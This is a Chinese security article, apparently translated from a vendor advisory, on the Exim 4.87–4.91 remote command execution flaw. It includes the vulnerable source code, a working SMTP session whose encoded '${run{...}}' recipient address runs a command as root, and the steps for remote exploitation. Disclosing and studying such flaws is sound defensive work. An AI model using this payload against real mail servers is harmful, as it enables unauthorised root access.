***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、摘要

**在对Exim邮件服务器的最新更改进行代码审查期间（<https://en.wikipedia.org/wiki/Exim>），我们发现了一个RCE漏洞，版本4.87至4.91（含）。在这种特殊情况下，RCE表示远程*命令*执行，而不是远程执行代码：攻击者可以以root身份执行execv（）的任意命令;不需要考虑任何内存损坏或涉及ROP（面向返回编程）问题。**

此漏洞可由本地攻击者立即利用（以及某些非默认配置中的远程攻击者）。远程在默认配置中利用此漏洞，即攻击者必须保持与易受攻击的服务器的连接打开7天（通过每隔几分钟发送一个字节）。但是，因为Exim的代码极其复杂，我们无法保证这一点开发方法独特;可能存在更快的方法。

自4.87版（4月6日发布）以来，Exim在默认情况下很容易受到攻击，2016），当#ifdef EXPERIMENTAL_EVENT成为#ifndef
DISABLE_EVENT;和如果启用了EXPERIMENTAL_EVENT，旧版本也可能容易受到攻击手动。令人惊讶的是，此漏洞在版本4.92中已得到修复（2019年2月10日发布）：

>
> <https://github.com/Exim/exim/commit/7ea1237c783e380d7bdb86c90b13d8203c7ecf26>
>
> <https://bugs.exim.org/show_bug.cgi?id=2310>

但未被确定为安全漏洞，并且大部分都在运行因此，系统受到影响。例如，我们利用最新的本通报中的Debian发行版（9.9）。

## 二、本地执行测试

漏洞代码位于deliver_message()函数中：

    
    
    6122 #ifndef DISABLE_EVENT
    6123       if (process_recipients != RECIP_ACCEPT)
    6124         {
    6125         uschar * save_local =  deliver_localpart;
    6126         const uschar * save_domain = deliver_domain;
    6127
    6128         deliver_localpart = expand_string(
    6129                       string_sprintf("${local_part:%s}", new->address));
    6130         deliver_domain =    expand_string(
    6131                       string_sprintf("${domain:%s}", new->address));
    6132
    6133         (void) event_raise(event_action,
    6134                       US"msg:fail:internal", new->message);
    6135
    6136         deliver_localpart = save_local;
    6137         deliver_domain =    save_domain;
    6138         }
    6139 #endif

因为expand_string（）识别“$ {run {<command> <args>}}”扩展项，而new->
address是邮件的收件人，本地攻击者只需发送邮件即可“$ {run {...}} @
localhost”（其中“localhost”是Exim的一个local_domains）并以root身份执行任意命令（默认情况下，deliver_drop_privilege为false）测试方法如下：

    
    
    john@debian:~$ cat /tmp/id
    cat: /tmp/id: No such file or directory
    
    john@debian:~$ nc 127.0.0.1 25
    220 debian ESMTP Exim 4.89 Thu, 23 May 2019 09:10:41 -0400
    HELO localhost
    250 debian Hello localhost [127.0.0.1]
    MAIL FROM:<>
    250 OK
    RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@localhost>
    250 Accepted
    DATA
    354 Enter message, ending with "." on a line by itself
    Received: 1
    Received: 2
    Received: 3
    Received: 4
    Received: 5
    Received: 6
    Received: 7
    Received: 8
    Received: 9
    Received: 10
    Received: 11
    Received: 12
    Received: 13
    Received: 14
    Received: 15
    Received: 16
    Received: 17
    Received: 18
    Received: 19
    Received: 20
    Received: 21
    Received: 22
    Received: 23
    Received: 24
    Received: 25
    Received: 26
    Received: 27
    Received: 28
    Received: 29
    Received: 30
    Received: 31
    
    .
    250 OK id=1hTnYa-0000zp-8b
    QUIT
    221 debian closing connection
    
    john@debian:~$ cat /tmp/id
    cat: /tmp/id: Permission denied
    
    root@debian:~# cat /tmp/id
    uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)
    uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)

在这个测试中：

>
> 1.我们发送的次数超过received_headers_max（默认为30）收到：“邮件服务器的头文件，将process_recipients设置为RECIP_FAIL_LOOP，从而执行易受攻击的代码;
>
>
> 2.我们使用反斜杠转义收件人地址中的无效字符，这些字符由expand_string（）（在expand_string_internal（）和transport_set_up_command（）中）方便地解释。

## 二、远程代码执行测试

我们的本地开发方法不能远程工作，因为Exim的默认配置中的“verify =
recipient”ACL（访问控制列表）要求收件人地址的本地部分（@符号前面的部分）是本地用户的名称：

    
    
    john@debian:~$ nc 192.168.56.101 25
    220 debian ESMTP Exim 4.89 Thu, 23 May 2019 10:06:37 -0400
    HELO localhost
    250 debian Hello localhost [192.168.56.101]
    MAIL FROM:<>
    250 OK
    RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@localhost>
    550 Unrouteable address

## 三、默认配置解决问题

首先，我们利用“bounce”消息成功解决“verify =
recipient”ACL问题：如果我们发送无法发送的邮件，Exim会自动向严格的发件人发送一条递送失败消息（“退回”）。换句话说，我们原始邮件的发件人（我们的MAIL
FROM）成为跳出的接收者（其RCPT TO），因此可以用“$ {run {...}}”执行命令。实际上，Exim默认配置中的“verify =
sender”ACL只能检查原始发件人地址的域部分，而不是本地部分（因为它是远程地址）。

接下来，反弹必须到达易受攻击的代码并通过process_recipients！=
RECIP_ACCEPT测试，但我们无法重用我们的received_headers_max技巧，因为我们无法控制反弹头。我们对第二个问题的解决方案不是最优的：如果是弹跳本身不能在7天后交付（默认情况下timeout_frozen_after），然后Exim将process_recipients设置为RECIP_FAIL_TIMEOUT并执行易受攻击的代码。

最后，我们必须解决一个看似棘手的问题：2天后（默认ignore_bounce_errors_after）除非延迟退出（通过临时传递失败），并且4天后默认重试规则（“F，2h，15m;
G，16h，1h，1.5;
F，4d，6h”），否则将丢弃跳出将延迟地址转换为失败的地址，因此在timeout_frozen_after的7天之前丢弃反弹。下面是我们对第三个问题的解决方案，以及一般的远程开发问题（但可能存在更简单，更快速的解决方案）：

>
> （1）我们连接到易受攻击的Exim服务器并发送不能的邮件交付（因为我们发送超过received_headers_max“收到：”头）。我们邮件的收件人地址（RCPT
> TO）是“postmaster”，它的发件人地址（MAIL FROM）是“$ {run {...}} @
> khazad.dum”（其中“khazad.dum”是我们控制的域名。
>
> （2）因为我们的邮件无法发送，Exim连接到khazad.dumMX（我们监听并接受此连接的地方）并开始发送退回邮件至“$ {run {...}} @
> khazad.dum”。
>
>
> （3）我们保持此连接开放7天（默认值timeout_frozen_after），每隔4分钟向Exim发送一个字节。这个因为Exim读取对其SMTP命令的响应（简单邮件）传输协议）用一个4096字节的缓冲区（DELIVER_BUFFER_SIZE）每次重置5分钟超时（默认的command_timeout）读取一个字节。
>
> （4）7天后，我们使用永久邮件完成冗长的SMTP响应交付失败（例如，“550 Unrouteable
> address”）冻结post_process_one（）中的反弹。这个功能实际上应该丢弃反弹而不是冻结它（这会阻止我们到达易受攻击的代码）因为它超过2天（默认值ignore_bounce_errors_after）：

## 四、非默认配置下

我们最终设计了一个精心设计的方法来远程利用Exim的默认配置，但是也很容易远程利用的各种非默认配置：

> （1）如果管理员手动删除了“verify = recipient”ACL（可能是为了防止通过RCPT
> TO进行用户名枚举），那么我们的本地开发方法也可以远程工作。
>
> （2）如果Exim配置为识别收件人地址的本地部分中的标签（例如通过“local_part_suffix = + *： -> *”），那么远程攻击者可以简单地重用我们的本地利用方法和RCPT TO“balrog + $ {run {...}} @
> localhost“（其中”balrog“是本地用户的名称）。
>
> （3）如果Exim配置为将邮件中继到远程域，作为辅助MX（Mail eXchange），则远程攻击者可以使用RCPT TO $ {run {...}}
> @ khazad简单地使用我们的本地利用方法。
> dum“（其中”khazad.dum“是Exim的relay_to_domains之一）。实际上，”verify =
> recipient“ACL只能检查远程地址的域部分（@符号后面的部分），而不是本地部分。
>
> （4）7天后，我们使用永久邮件完成冗长的SMTP响应交付失败（例如，“550 Unrouteable
> address”）冻结post_process_one（）中的反弹。
> 这个功能实际上应该丢弃反弹而不是冻结它（这会阻止我们到达易受攻击的代码）因为它超过2天（默认值ignore_bounce_errors_after）：
    
    
    1613   /* If this is a delivery error, or a message for which no replies are  
    1614   wanted, and the message's age is greater than ignore_bounce_errors_after,  
    1615   force the af_ignore_error flag. This will cause the address to be discarded  
    1616   later (with a log entry). */  
    1617  
    1618   if (!*sender_address && message_age >= ignore_bounce_errors_after)  
    1619     setflag(addr, af_ignore_error);

然而，在这种特殊情况下，message_age不是反弹的真实时间（超过7天），但它是从Exim的线轴首次加载时的时间（当它只有几秒钟或几分钟时）。

> （5）最后，Exim的下一个队列运行（默认情况下每30分钟启动一次）Debian）从假脱机加载冻结弹跳，设置process_recipients  
>
>
> 到RECIP_FAIL_TIMEOUT（这次，message_age是反弹的真实年龄，超过7天），并执行易受攻击的代码和我们的命令（我们的
>
> 原始发件人地址“$ {run {...}} @ khazad.dum”是反弹的收件人地址，由expand_string（）解释。

注意：快速测试这种远程开发方法，日期Exim的默认值为timeout_frozen_after，ignore_bounce_errors_after可以由小时替换，默认重试规则由“F，4h，6m”替换。

 ***本文作者：freexploit，转载请注明来自FreeBuf.COM**

